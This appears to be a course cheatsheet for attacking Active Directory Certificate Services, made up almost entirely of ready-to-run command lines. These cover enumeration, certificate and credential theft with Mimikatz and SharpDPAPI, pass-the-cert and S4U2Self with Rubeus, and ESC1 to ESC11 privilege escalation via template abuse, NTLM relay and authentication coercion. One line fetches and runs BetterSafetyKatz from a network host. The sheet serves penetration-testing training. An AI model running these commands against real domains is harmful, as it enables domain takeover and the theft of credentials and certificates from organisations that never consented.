# CESP-ADCS Course Cheatsheet


## General

#### Enumeration

Enumerate Certificate Authorities:

```
C:\ADCS\Tools\Certify.exe cas
certutil -TCAInfo
```

Enumerate templates:

```
C:\ADCS\Tools\Certify.exe find
certutil -v -dstemplate 
```

Enumerate templates allow client authentication:

```
Certify.exe find /clientauth 
```

Enumerate CertStore - certutil

```
certutil -store My
certutil -user -store My
```

Enumerate CertStore - CertifyKit

```
C:\Users\Public\CertifyKit.exe list
```

Enumerate CertStore - Powershell

```
Get-ChildItem Cert:\CurrentUser\ -Recurse
Get-ChildItem Cert:\LocalMachine\ -Recurse
Get-ChildItem Cert:\CurrentUser\My -Recurse
Get-ChildItem Cert:\LocalMachine\My -Recurse
```

Enumerate CAs:

```
certutil -CAInfo
```

Enumerate Trusted Root Certification Authorities Root store:

```
certutil -store -enterprise Root
```


#### Request (PERSIST1)

```
C:\ADCS\Tools\Certify.exe find
C:\ADCS\Tools\Certify.exe request /ca:CA_NAME /user:USER /domain:DOMAIN /template:TEMPLATE_NAME
```


#### Certpotato - S4U2Self

```
C:\ADCS\Tools\Rubeus.exe s4u /self /impersonateuser:Administrator /altservice:cifs|http|.../MACHINE.DOMAIN /dc:DC.DOMAIN /user:COMPUTER$ /rc4:HASH /ptt
C:\ADCS\Tools\Rubeus.exe s4u /self /impersonateuser:Administrator /altservice:cifs|http|.../MACHINE.DOMAIN /dc:DC.DOMAIN /user:COMPUTER$ /ticket:TICKET.kirbi /ptt
```


#### UnPAC-The-Hash (THEFT5)

```
C:\ADCS\Tools\Rubeus.exe asktgt /getcredentials /user:COMPUTER$ /certificate:C:\ADCS\Certs\cb-webapp1.pfx /password:PASSWORD /domain:DOMAIN /dc:DC.DOMAIN /show
```


#### Conversion 

Convert .pem to .pfx certificate:

```
C:\ADCS\Tools\openssl\openssl.exe pkcs12 -in C:\ADCS\Certs\USER.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\ADCS\Certs\USER.pfx
```


#### Export (THEFT1)

Using certutil:

```
certutil -p "PASSWORD" -exportpfx HASH C:\Users\Public\USER.pfx
certutil -exportpfx -p "PASSWORD" -enterprise Root HASH C:\Users\Public\CA_NAME.p12
```

Using CertifyKit:

```
C:\Users\Public\CertifyKit.exe list /storename:my /storelocation:localmachine /certificate:CERTIFICATE_HASH /outfile:C:\Users\Public\USER.pfx
CertifyKit.exe list /certificate:CERTIFICATE_HASH /base64
```

Using Mimikatz:

```
C:\Users\Public\Loader.exe -path http://IP/BetterSafetyKatz.exe -args "crypto::capi" "privilege::debug" "crypto::certificates /systemstore:local_machine /store:my /export" "exit"
```

Using Powershell:

```
$mypwd = ConvertTo-SecureString -String "PASSWORD" -Force -AsPlainText
Export-PfxCertificate -Cert Cert:\LocalMachine\My\CERTIFICATE_HASH -FilePath C:\Users\Public\USER.pfx -Password $mypwd
```


#### Export - DPAPI (THEFT2 and THEFT3)

Export certificates from the User:

```
C:\Users\Public\SharpDPAPI.exe certificates
C:\Users\Public\SharpDPAPI.exe certificates /password:PASSWORD
```


Export certificates from the Machine:

```
C:\Users\Public\SharpDPAPI.exe certificates /machine
lsadump::secrets
crypto::certificates /export /systemstore:LOCAL_MACHINE
```


#### Parse

Parse certificates:

```
certutil -dump -v C:\Users\certstore\OpenVPN\config\CERT.pem
certutil -v -dump C:\ADCS\Certs\USER.pfx
certutil -v -dump -p "PASSWORD" C:\ADCS\Certs\CERT.pfx
```

#### Install

```
C:\Users\Public\CertifyKit.exe list /certificate:C:\Users\Public\CERT.pfx /password:PASSWORD /install
certutil -user -store My
C:\Users\Public\CertifyKit.exe list /certificate:C:\Users\USER\EncryptedFiles\USER.pfx /storename:My /install
```


#### Renew (PERSIST3)

```
certreq -enroll -user -q -PolicyServer * -cert CERT_HASH renew reusekeys
certreq -enroll -user -q -cert CERT_HASH renew
```


#### Pass-The-Cert

```
C:\ADCS\Tools\Rubeus.exe asktgt /user:USER /certificate:C:\ADCS\Certs\USER.pfx /password:PASSWORD /domain:DOMAIN /dc:DC.DOMAIN /nowrap /ptt
```


----------------------------------


## ESCx Abuses

#### ESC1

Description: ESS + Enroll account + (Smart Card Logon / PKINIT authentication / Client Authentication EKU)

ESC1 Enumeration:

```
C:\Users\Public\Certify.exe cas
C:\ADCS\Tools\Certify.exe find /enrolleeSuppliesSubject
C:\Users\Public\Certify.exe find /domain:protectedDOMAIN
```

- Template CA: CBP-CA
- Template Name: ProtectedUserAccess
- ENROLLEE_SUPPLIES_SUBJECT flag is enabled allowing SAN
- Client Authentication bit is enabled
   → Smart Card Logon --> 1.3.6.1.4.1.311.20.2.2
   → PKINIT authentication --> 1.3.6.1.5.2.3.4
   → Client Authentication --> 1.3.6.1.5.5.7.3.2
- Enrollment Rights enabled for: PROTECTEDCB\protecteduser


ESC1 exploitation:

```
C:\Users\Public\Certify.exe request /ca:CA_NAME /template:TEMPLATE_NAME /altname:administrator /sidextension:DOMAIN_SID-500 /domain:DOMAIN
```


#### ESC2

Description: ESS + Enroll account + (Any Purpose / No EKU)

ESC2 Enumeration:

```
C:\Users\Public\Certify.exe find /enrolleeSuppliesSubject
```

- Template CA: CBP-CA
- Template Name: Substitute-ProtectedUserAccess
- CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT flag (ENROLLEE_SUPPLIES_SUBJECT) is enabled allowing SAN abuse
- Any Purpose EKU is enabled
   → Any Purpose EKU --> 2.5.29.37.0
   → No EKU
- Enrollment Rights enabled for: PROTECTEDCB\protecteduser
- Validity Period: 6 days


ESC2 exploitation:

```
C:\Users\Public\Certify.exe request /ca:CA_NAME /template:TEMPLATE_NAME /altname:administrator /sidextension:DOMAIN_SID-500 /domain:DOMAIN
```


#### ESC4

Description: Owner, FullControl, WriteOwner, WriteDacl, WriteProperty -> Modify settings to exploit ESC1, ESC2, ESC3

Set ESS + Enroll account + EKU
   → Client Authentication
   → Smart Card Logon (OID: 1.3.6.1.4.1.311.20.2.2)
   → PKINIT Client Authentication (OID: 1.3.6.1.5.2.3.4)
   → Any Purpose (OID: 2.5.29.37.0)
   → No EKU
   
   
ESC4 Enumeration

```
C:\ADCS\Tools\Certify.exe find /templates
C:\ADCS\Tools\Certify.exe pkiobjects
C:\ADCS\Tools\StandIn\StandIn_v13_Net45.exe --adcs --filter TEMPLATE_NAME
C:\ADCS\Tools\CertifyKit.exe find /templates
```


ESC4 - Enable SmartCardLogon EKU instead of the Client Authentication EKU:

```
C:\ADCS\Tools\CertifyKit.exe request /ca:CA_NAME /template:TEMPLATE_NAME /altname:administrator /domain:DOMAIN /alter /sidextension:DOMAIN_SID-500
```

ESC4 exploitation:

```
C:\ADCS\Tools\StandIn\StandIn_v13_Net45.exe --adcs --filter TEMPLATE_NAME --ess --add
C:\ADCS\Tools\StandIn\StandIn_v13_Net45.exe --adcs --filter TEMPLATE_NAME --ntaccount DOMAIN\USER --enroll --add
StandIn_v13_Net45.exe --ADCS --filter TEMPLATE_NAME --clientauth --add
C:\ADCS\Tools\StandIn\StandIn_v13_Net45.exe --adcs --filter User --ntaccount DOMAIN\USER --write --add
```


#### ESC3

Description:

Template 1: Provides Enrollment Agent Certificate
- Certificate Request Agent EKU --> 1.3.6.1.4.1.311.20.2.1 is enabled.
- Enrollment Rights are enabled for a user that we control.
Template 2: Allows Enrollment Agent Certificate to use on-behalf-of
- Client Authentication EKU --> 1.3.6.1.5.5.7.3.2 is enabled.
- Application Policy Issuance Requirement with Authorized Signatures Required enabled and set to 1
- Certificate Request Agent EKU enabled.
- Enrollment Rights are enabled for a user that we control.


ESC3 Enumeration

```
C:\ADCS\Tools\Certify.exe find
```

ESC3 - Enroll in template with Certificate Request Agent EKU set (TEMPLATE_NAME) to receive an Enrollment Agent Certificate:

```
C:\ADCS\Tools\Certify.exe request /ca:CA_NAME /template:TEMPLATE_NAME /user:USER /domain:DOMAIN
```

ESC3 - Use the Enrollment Agent certificate to enroll in a template (TEMPLATE_NAME_2) on behalf of another user:

```
C:\ADCS\Tools\Certify.exe request /ca:CA_NAME /template:TEMPLATE_NAME_2 /onbehalfof:DOMAIN\administrator /enrollcert:C:\ADCS\Certs\esc3-enrollmentAgent.pfx /enrollcertpw:PASSWORD /domain:DOMAIN
```


#### ESC8

Description: Web enrollment interface: http://CA_NAME.DOMAIN/certsrv/certsnsh.asp


ESC8 - Enumerate HTTP Enrollment Endpoints:

```
certutil -enrollmentServerURL -config CA_NAME
cd /opt/Tools/Certipy
source certipy_venv/bin/activate
certipy find -u USER@DOMAIN -p 'PASSWORD' -dc-ip DC_IP -stdout
```


ESC8 - Set up relay

```
cd /opt/Tools/impacket
sudo su
source impacket_venv/bin/activate
/opt/Tools/impacket/examples/ntlmrelayx.py -t http://CA_NAME.DOMAIN/certsr/certfnsh.asp -smb2support --adcs --template 'DomainController'
```

ESC8 - Coerce authentication

```
cd /opt/Tools/Coercer/
source coercer_venv/bin/activate
/opt/Tools/Coercer/Coercer.py coerce -l MACHINE_NAME.DOMAIN -t DC.DOMAIN -u USER -p 'PASSWORD' -d DOMAIN -v --filter-method-name "EfsRpcDuplicateEncryptionInfoFile"
```


#### ESC11

Enumerate ICPR

```
cd /opt/Tools/Certipy-esc11/
source certipy_esc11_venv/bin/activate
certipy find -u USER@DOMAIN -p 'PASSWORD' -stdout
```

Set up relay

```
cd /opt/Tools/impacket-esc11
sudo su
source impacket_esc11_venv/bin/activate
/opt/Tools/impacket-esc11/examples/ntlmrelayx.py -t "rpc://CA_NAME.DOMAIN" -rpc-mode ICPR -icpr-ca-name "CA_NAME" -smb2support --adcs --template 'DomainControllerAuthentication'
```

Coerce authentication

```
cd /opt/Tools/Coercer/
source coercer_venv/bin/activate
/opt/Tools/Coercer/Coercer.py coerce -l MACHINE_NAME.DOMAIN -t DC.DOMAIN -u USER -p 'PASSWORD' -d DOMAIN -v --filter-method-name "EfsRpcDuplicateEncryptionInfoFile"
```


#### ESC7.1

Enumeration

```
C:\ADCS\Tools\Certify.exe cas
C:\ADCS\Tools\Certify.exe find
```

Request certificate from SubCA for the EA (https://github.com/blackarrowsec/Certify) - Denied + Get private key

```
C:\ADCS\Tools\Certify.exe request /ca:CA_NAME /template:subCA /altname:administrator /domain:internalDOMAIN /sidextension:DOMAIN_SID-500
```

Issue the failed certificate request

```
C:\ADCS\Tools\Certify-esc7.exe issue /ca:CA_NAME /id:69
```

Retrieve the issued request - Get certificate

```
C:\ADCS\Tools\Certify-esc7.exe download /ca:CA_NAME.DOMAIN\CBCA /id:69
```

Convert private key + certificate from .pem to .pfx

```
C:\ADCS\Tools\openssl\openssl.exe pkcs12 -in C:\ADCS\Certs\esc7.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\ADCS\Certs\esc7.pfx
```

EXTRA - No ManageCertificates -> Add ourselves as a new officer using existing ManageCA:

```
certipy ca -u USER@internalDOMAIN -hashes 'HASHES:HASHES' -ca 'CA_NAME' -dc-ip DC_IP -target CA_NAME.DOMAIN -add-officer USER
```

EXTRA - If SubCA disabled -> Enable ManageCA:

```
certipy ca -u USER@internalDOMAIN -hashes 'HASHES:HASHES' -ca 'CA_NAME' -dc-ip DC_IP -target CA_NAME.DOMAIN -enable-template 'SubCA'
```


----------------------------------

## Interesting reads

- ESC1 to ESC7: [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)

- CertPotato: [https://sensepost.com/blog/2022/certpotato-using-adcs-to-privesc-from-virtual-and-network-service-accounts-to-local-system/](https://sensepost.com/blog/2022/certpotato-using-adcs-to-privesc-from-virtual-and-network-service-accounts-to-local-system/)

- ESC7 Case 1: [https://www.tarlogic.com/blog/ad-cs-esc7-attack/](https://www.tarlogic.com/blog/ad-cs-esc7-attack/)

- ESC7 Case 2: [https://www.tarlogic.com/blog/ad-cs-manageca-rce/](https://www.tarlogic.com/blog/ad-cs-manageca-rce/)

- ESC9, ESC10 Case1 and Case 2: [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)

- ESC11: [https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/)

- Certifried: [https://research.ifcr.dk/certifried-active-directory-domain-privilegeescalation-cve-2022-26923-9e098fe298f4](https://research.ifcr.dk/certifried-active-directory-domain-privilegeescalation-cve-2022-26923-9e098fe298f4)
